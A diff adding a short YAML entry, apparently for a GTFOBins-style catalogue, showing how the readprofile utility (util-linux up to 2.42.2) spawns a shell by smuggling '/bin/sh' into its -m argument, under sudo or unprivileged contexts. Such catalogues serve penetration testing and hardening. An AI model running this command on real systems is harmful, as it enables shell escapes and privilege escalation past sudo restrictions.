@@ -1,0 +1,13 @@
+---
+functions:
+  shell:
+  - code: |-
+      TMPFILE=$(mktemp)
+      echo "_stext" > $TMPFILE
+      readprofile -p $TMPFILE -m '/dev/null; /bin/sh >&2 #.gz'
+    comment: |-
+      Affects util-linux version <= 2.42.2.
+    contexts:
+      sudo:
+      unprivileged:
+...
